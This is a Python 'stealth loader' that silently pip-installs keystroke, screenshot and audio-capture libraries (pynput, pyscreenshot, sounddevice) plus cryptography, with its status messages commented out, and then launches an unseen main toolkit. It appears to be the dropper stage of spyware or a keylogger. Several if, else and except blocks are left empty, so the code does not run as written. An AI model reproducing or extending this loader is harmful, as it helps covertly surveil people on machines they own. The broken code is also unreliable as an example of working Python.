#!/usr/bin/env python3
"""
Stealth loader for the security research toolkit.
Handles auto-installation and launches main functionality.
"""
import os
import sys
import time
import threading
from pathlib import Path

def check_dependencies():
    """Check if required packages are installed."""
    # print("Checking dependencies...")
    required_modules = ['pynput', 'pyscreenshot', 'sounddevice', 'cryptography', 'PIL']
    missing = []
    
    for module in required_modules:
        try:
            __import__(module)
            # print(f"✓ {module} found")
        except ImportError:
            # print(f"✗ {module} missing")
            missing.append(module)
    
    return missing

def install_if_needed():
    """Install Python, pip, and dependencies if missing."""
    # print("Starting dependency check and installation...")
    missing = check_dependencies()
    
    if missing:
        # print(f"Missing dependencies: {missing}")
        # print("System components need initialization...")
        
        # Try to import enhanced installer
        try:
            from core.enhanced_installer import EnhancedInstaller
            # print("Enhanced installer found, using it...")
            installer = EnhancedInstaller()
            success = installer.install_dependencies()
            
            if not success:
                # print("Some components failed to initialize. Continuing anyway...")
            
            # Verify installation
            verification = installer.verify_installation()
            missing_modules = [mod for mod, available in verification.items() if not available]
            
            if missing_modules:
                # print(f"Warning: Some components still missing: {missing_modules}")
                
        except ImportError as e:
            # print(f"Enhanced installer not available: {e}")
            # Fallback to simple installer
            # print("Enhanced installer not available, using basic installation...")
            try:
                import subprocess
                for package in missing:
                    # print(f"Installing {package}...")
                    subprocess.check_call([
                        sys.executable, "-m", "pip", "install", 
                        "--quiet", "--disable-pip-version-check", package
                    ])
            except Exception as e:
                print(f"Installation failed: {e}")
                return False
    else:
        # print("All dependencies are already installed!")
    
    return len(check_dependencies()) == 0

def launch_main():
    """Launch the main toolkit."""
    # print("Launching main toolkit...")
    try:
        # Import and run main functionality
        from main import main
        main()
    except Exception as e:
        print(f"System error: {e}")
        time.sleep(5)

def main():
    """Main stealth loader function."""
    # print("=" * 50)
    # print("Stealth Loader Starting...")
    # print("=" * 50)
    
    # Check and install dependencies
    if install_if_needed():
        # print("All dependencies installed successfully!")
    else:
        # print("Warning: Some dependencies may be missing")
    
    # Launch main toolkit
    launch_main()

if __name__ == "__main__":
    main()